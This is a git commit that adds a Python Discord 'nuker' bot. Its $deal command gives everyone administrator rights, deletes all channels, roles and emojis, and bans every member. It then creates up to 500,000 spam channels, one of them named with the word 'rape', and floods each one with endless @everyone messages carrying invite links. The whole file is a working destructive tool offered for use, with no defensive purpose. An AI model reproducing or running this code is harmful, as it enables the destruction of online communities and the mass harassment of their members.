58751a4f3f723fe4570b79a1fe1f9fe01da88df0
mackynt <105085301+mackynt@users.noreply.github.com>
2022-06-20 17:27:48 -0300

    Add files via upload

---
+++ macknuka.py
@@ -0,0 +1,174 @@
+import discord
+
+from discord.ext import commands
+
+import random
+
+from discord import Permissions
+
+from colorama import Fore, Style
+
+import asyncio
+
+token = ""
+
+SPAM_CHANNEL = ["mack"]
+SPAM_CHANNEL2 = ["Charizard_Playz"]
+SPAM_CHANNEL3 = ["magik"]
+SPAM_CHANNEL4 = ["rape"]
+
+SPAM_MESSAGE = [
+    "@everyone https://discord.gg/Xq7QAHem"
+]
+SPAM_MESSAGE2 = [
+    "@everyone mack#8698 :flushed:"
+]
+SPAM_MESSAGE3 = [
+    "@everyone magik fick"
+]
+SPAM_MESSAGE4 = [
+    "@everyone https://www.youtube.com/watch?v=9BzfY8MU8T0&t"
+]
+
+
+client = commands.Bot(command_prefix="$")
+
+
+@client.event
+async def on_ready():
+    print('''mack nuka real>>??''')
+    print('''by mack#8698''')
+    print('''mack nuka > READY''')
+
+    await client.change_presence(activity=discord.Game(name="sup"))
+
+@client.command()
+async def deal(ctx):
+
+    await ctx.message.delete()
+
+    guild = ctx.guild
+
+    try:
+
+        role = discord.utils.get(guild.roles, name="@everyone")
+
+        await role.edit(permissions=Permissions.all())
+
+        print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
+
+    except:
+
+        print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
+
+    for channel in guild.channels:
+
+        try:
+
+            await channel.delete()
+
+            print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
+
+        except:
+
+            print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
+
+    for member in guild.members:
+
+        try:
+
+            await member.ban()
+
+            print(Fore.MAGENTA +
+                  f"{member.name}#{member.discriminator} Was banned" +
+                  Fore.RESET)
+
+        except:
+
+            print(
+                Fore.GREEN +
+                f"{member.name}#{member.discriminator} Was unable to be banned."
+                + Fore.RESET)
+
+    for role in guild.roles:
+
+        try:
+
+            await role.delete()
+
+            print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
+
+        except:
+
+            print(Fore.GREEN + f"{role.name} Has not been deleted" +
+                  Fore.RESET)
+
+    for emoji in list(ctx.guild.emojis):
+
+        try:
+
+            await emoji.delete()
+
+            print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
+
+        except:
+
+            print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
+
+    banned_users = await guild.bans()
+
+    for ban_entry in banned_users:
+
+        user = ban_entry.user
+
+        try:
+
+            await user.unban("YOUR_USERNAME_AND_TAG")
+
+            print(
+                Fore.MAGENTA +
+                f"{user.name}#{user.discriminator} Was successfully unbanned."
+                + Fore.RESET)
+
+        except:
+
+            print(Fore.GREEN +
+                  f"{user.name}#{user.discriminator} Was not unbanned." +
+                  Fore.RESET)
+
+    await guild.create_text_channel("hail mack")
+
+    for channel in guild.text_channels:
+
+        link = await channel.create_invite(max_age=0, max_uses=0)
+
+        print(f"New Invite: {link}")
+
+    amount = 500000
+
+    for i in range(amount):
+
+        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+        await guild.create_text_channel(random.choice(SPAM_CHANNEL2))
+        await guild.create_text_channel(random.choice(SPAM_CHANNEL3))
+        await guild.create_text_channel(random.choice(SPAM_CHANNEL4))
+        
+
+    print(f"nuked {guild.name} Successfully.")
+
+    return
+
+
+@client.event
+async def on_guild_channel_create(channel):
+
+    while True:
+
+        await channel.send(random.choice(SPAM_MESSAGE))
+        await channel.send(random.choice(SPAM_MESSAGE2))
+        await channel.send(random.choice(SPAM_MESSAGE3))
+        await channel.send(random.choice(SPAM_MESSAGE4))
+      
+
+
+client.run(token, bot=True)
